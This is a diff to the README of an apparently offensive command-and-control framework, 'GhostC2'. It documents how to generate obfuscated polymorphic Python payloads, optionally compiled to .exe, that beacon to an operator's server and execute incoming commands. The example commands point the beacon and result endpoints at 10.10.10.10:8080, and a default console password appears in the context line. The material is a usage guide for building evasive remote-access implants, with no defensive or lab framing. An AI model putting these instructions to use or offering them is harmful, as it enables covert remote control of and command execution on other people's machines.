@@ -65,20 +65,46 @@ Password: ghostpass123
 
 ## 👾 Payloads
 
-### ✅ WebSocket Agent *currently being worked on use payload generator(!recommended) or ghost_payload.py(default payload for testing)*
+### ✅ WebSocket Agent *(experimental – not recommended for active use)*
+Basic agent that connects via WebSocket:
+
 ```bash
 python payloads/ghost_socket_payload.py
 ```
 
-### 🧬 Generate Polymorphic Payload
+---
+
+### 🧬 Generate Polymorphic Payload *(recommended)*
+This will generate an obfuscated Python payload that beacons to your GhostC2 server and executes incoming commands.
+
 ```bash
-python tools/generate_payload.py            # .py only
-python tools/generate_payload.py --exe      # .py + .exe
+# Generate a Python payload only
+python tools/generate_payload.py
+
+# Generate Python + compile to .exe (requires PyInstaller)
+python tools/generate_payload.py --exe
 ```
 
-Output saved to `builds/`
+Output will be saved to the `builds/` directory.
 
 ---
+
+### 🌐 Example: Generate payload for 10.10.10.10
+
+```bash
+python tools/generate_payload.py \
+  --c2 http://10.10.10.10:8080/beacon \
+  --result http://10.10.10.10:8080/result
+```
+
+To also compile to `.exe`:
+
+```bash
+python tools/generate_payload.py \
+  --c2 http://10.10.10.10:8080/beacon \
+  --result http://10.10.10.10:8080/result \
+  --exe
+```
 
 ## 🖥️ Operator Console
 
